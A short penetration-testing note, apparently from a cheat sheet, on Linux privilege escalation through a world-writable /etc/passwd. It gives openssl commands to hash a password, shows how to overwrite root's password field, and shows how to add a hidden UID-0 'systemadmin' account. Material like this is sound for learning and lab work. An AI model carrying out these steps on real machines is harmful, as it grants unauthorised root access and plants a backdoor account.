# Living off the Land

## Weak File Permissions - Writable `/etc/passwd`

`$ openssl passwd -1 thispass123`

For older linux systems

`$ openssl passwd -1 -salt new thispass123`

We have two ways to modify the `passwd` file:

## Exploit

### Overwrite password via hash digest

Replace the letter `x` for the newly generated salt hash for the `/etc/passwd`.

`root:x:0:0:root:/root:/bin/bash`

Authenticate as root with the password

`$ su root`

### Create User Account

Create a new account as root with the previous generated hashed password. Here's what the format looks like:

Note: replace `<new_hash>` with the hashed password

```
systemadmin:<new_hash>:0:0:Sysadmin:/root:/bin/bash
```

---
## References

- [Linux Privesc Wrong Permissions](https://wixnic.github.io/linux-privesc-wrong-permissions/)

- [Linux Privilege Escalation Writable Passwd File](https://steflan-security.com/linux-privilege-escalation-writable-passwd-file/)